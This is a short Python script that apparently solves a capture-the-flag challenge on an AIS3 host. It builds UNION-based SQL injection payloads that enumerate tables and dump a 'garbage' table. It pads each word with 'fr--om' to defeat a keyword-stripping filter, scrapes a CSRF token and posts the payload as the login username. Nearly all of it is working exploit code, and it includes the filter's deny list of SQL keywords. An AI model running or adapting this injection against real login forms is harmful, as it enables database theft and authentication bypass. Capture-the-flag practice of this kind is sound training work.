import requests

org = "SELECT * FROM users WHERE username = '{}' AND password = 'hash'"

# inject = "' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table' LIMIT 0,1 /*"
# inject = "' UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='garbage' /*"
# inject = "' UNION SELECT 1,COUNT(id),3 FROM garbage /*"
inject = "' UNION SELECT 1,id||'||'||name||'||'||value,3 FROM garbage LIMIT 2,1 /*"

inject = "\t".join(s[:len(s)//2] + "fr--om" + s[len(s)//2:] for s in inject.split(" "))

#print(inject)

bad = [' ', '/*', '*/', 'select', 'union', 'or', 'and', 'where', 'from', '--']

reconst = inject

for b in bad:
    reconst = reconst.replace(b, "").replace(b.capitalize(), "")

for b in bad:
    reconst = reconst.replace(b, "").replace(b.capitalize(), "")

print(reconst)

url = "https://turtowl.ais3.org"

s = requests.session()
r = s.get(url)
csrf = r.text[938:1026]

#print(csrf)

post = {"csrf_token": csrf, "username": inject, "password": "admin", "submit": "Login"}
s.post(url + "/?action=login", data=post)

r = s.get(url)
print("")
print("\n".join(r.text.splitlines()[15:-6]))

